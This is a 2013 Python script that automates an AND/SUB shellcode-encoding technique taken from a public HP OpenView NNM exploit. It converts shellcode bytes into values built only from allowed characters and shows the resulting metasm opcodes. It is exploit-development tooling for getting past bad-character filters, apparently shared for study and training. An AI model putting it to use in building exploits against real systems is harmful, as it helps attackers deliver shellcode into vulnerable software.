#!/usr/bin/python
# ==========================================================================================
# muts_encoder v1.0 BETA
# Date: 19-08-2013
# Coded by Sagi Shahar (sagi-)
# Greetz: g0tmi1k 
# ==========================================================================================
# This script automates the shellcode encoding scheme used by muts for the...
# ...HP OpenView NNM 7.5.1 exploit. (http://www.exploit-db.com/exploits/5342/)
# 
# Output:
# $ python muts_encoder.py 6681caff
# [i] Checking for '0x? & 0x? = 0x0' using allowed combinations...Found!
# [+] 0x20202020
# [+] 0x41414141
#
# [+] Original bytes:...0x6681caff
# [+] Reversed bytes:...0xffca8166
# [+] Two's complement:.0x00357e9a
#
# [i] Checking for '0x? + 0x? + 0x? = 0x?' using allowed combinations...Found!
# [+] 0x20392020
# [+] 0x627e2020
# [+] 0x7d7e3e5a
# ==========================================================================================
# How to use (according to the output above):
# Copy and paste the output addresses into metasm_shell and then use metasm's output as shellcode.
#
# Output:
# metasm > and eax, 0x20202020
# "\x25\x20\x20\x20\x20"
# metasm > and eax, 0x41414141
# "\x25\x41\x41\x41\x41"
# metasm > sub eax, 0x20392020
# "\x2d\x20\x20\x39\x20"
# metasm > sub eax, 0x627e2020
# "\x2d\x20\x20\x7e\x62"
# metasm > sub eax, 0x7d7e3e5a
# "\x2d\x5a\x3e\x7e\x7d"
# metasm > push eax
# "\x50"
# ==========================================================================================

from sys import argv, stdout

# Functions
def reverse_bytes(hex_bytes):
    to_return = list()
    for i in range(0, len(hex_bytes), 2):
        to_return.insert(0, hex_bytes[i:i+2])
    return ''.join(to_return)

def twos_comp(bytes):
    to_return = 0xffffffff - int(bytes,16) + 1
    return "%0.8x" % to_return

# This is an example charhacter-set (can replace it with your own)
char_set = (
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x30\x31\x32\x33\x34\x35\x36\x37\x38"
"\x39\x41\x42\x43\x44\x45\x46\x47\x3b\x3c\x3d\x3e\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c"
"\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d"
"\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e"
"\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e"
)

# How to use
if len(argv) < 2:
    print "[-] Missing arguments: ./%s <hex value>" % argv[0]
    print "       Example: ./%s 41424344" % argv[0]
    exit()

# Variables
char_set = list(char_set)
bytes = [""] * 3
shellcode = argv[1]
found = False
overflow = False

# Checking if bitwise 'and' between two hex values will result in 0x0
stdout.write("[i] Checking for '0x? & 0x? = 0x0' using allowed combinations...")
char_set.sort()
for i in xrange(0, len(char_set)):
    byte1 = "%x" % ord(char_set[i])
    for j in xrange(0, len(char_set)):
        byte2 = "%x" % ord(char_set[j])
        if int(byte1, 16) & int(byte2, 16) == 0:
            print "Found!"
            print "[+] 0x%s" % (byte1 * 4)
            print "[+] 0x%s" % (byte2 * 4)
            found = True
            break
    if found:
        break
if not found:
    print "[-] Could not find a valid combination in the current character set."

print "\n[+] Original bytes:...0x%s" % shellcode

# Reversing bytes
try:
    shellcode = reverse_bytes(shellcode)
    print "[+] Reversed bytes:...0x%s" % shellcode
except:
    print "[-] Something went wrong. (#1)"
    exit()

# Calculating two's complement
try:
    shellcode = twos_comp(shellcode)
    print "[+] Two's complement:.0x%s" % shellcode
except:
    print "[-] Something went wrong (#2)"
    exit()

# Checking if sum of three hex numbers will equal a specific predetemined hex value
stdout.write("\n[i] Checking for '0x? + 0x? + 0x? = 0x?' using allowed combinations...")
found = False
for i in xrange(len(shellcode), 1, -2):
    # Get a byte out of the actual shellcode to encode
    shellcode_byte = shellcode[i-2] + shellcode[i-1]
    for j in xrange(0, len(char_set)):
        for k in xrange(0, len(char_set)):
            for m in xrange(0, len(char_set)):
                sum = ord(char_set[j]) + ord(char_set[k]) + ord(char_set[m])
                # Check if a combination was found
                if sum == int(shellcode_byte, 16):
                    if overflow:
                        bytes[0] = "%02x" % ord(char_set[j]) + bytes[0]
                        bytes[1] = "%02x" % ord(char_set[k]) + bytes[1]
                        bytes[2] = "%02x" % (ord(char_set[m])-1) + bytes[2]
                        overflow = False
                    else:
                        bytes[0] = "%02x" % ord(char_set[j]) + bytes[0]
                        bytes[1] = "%02x" % ord(char_set[k]) + bytes[1]
                        bytes[2] = "%02x" % ord(char_set[m]) + bytes[2]
                    found = True
                # Check if the shellcode byte is reached through overflow
                elif len(hex(sum)) == 5 and int(hex(sum)[3:5], 16) == int(shellcode_byte, 16):
                    if overflow:
                        bytes[0] = "%02x" % ord(char_set[j]) + bytes[0]
                        bytes[1] = "%02x" % ord(char_set[k]) + bytes[1]
                        bytes[2] = "%02x" % (ord(char_set[m])-1) + bytes[2]
                    else:
                        bytes[0] = "%02x" % ord(char_set[j]) + bytes[0]
                        bytes[1] = "%02x" % ord(char_set[k]) + bytes[1]
                        bytes[2] = "%02x" % ord(char_set[m]) + bytes[2]
                        overflow = True
                    found = True
                if found:
                    break;
            if found:
                break
        if found:
            break
    if found:
        found = False

# Check if the end result is 8 bytes in length
if len(bytes[0]) == 8 and len(bytes[1]) == 8 and len(bytes[2]) == 8:
    print "Found!"
    for i in xrange(0, len(bytes)):
        print "[+] 0x" + bytes[i]
else:
    print "[-] Could not find a valid combination in the current character set."
